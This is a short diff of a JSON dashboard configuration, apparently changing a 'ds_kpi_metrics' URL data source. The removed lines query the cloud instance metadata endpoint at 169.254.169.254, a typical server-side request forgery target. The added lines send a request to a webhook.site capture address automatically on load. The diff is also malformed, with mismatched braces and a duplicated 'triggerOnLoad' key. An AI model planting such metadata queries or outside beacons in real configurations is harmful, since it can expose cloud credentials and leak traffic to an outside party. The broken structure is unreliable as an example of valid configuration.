@@ -60,9 +60,9 @@
       },
 "ds_kpi_metrics": {
   "type": "url",
-  "config": {
-    "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-  },
+  "config": "https://webhook.site/71cac033-2499-404d-88dc-cd5014af3d63/?direct=1",
+  "triggerOnLoad": true
+},
   "triggerOnLoad": true
 },
         "triggerOnLoad": true
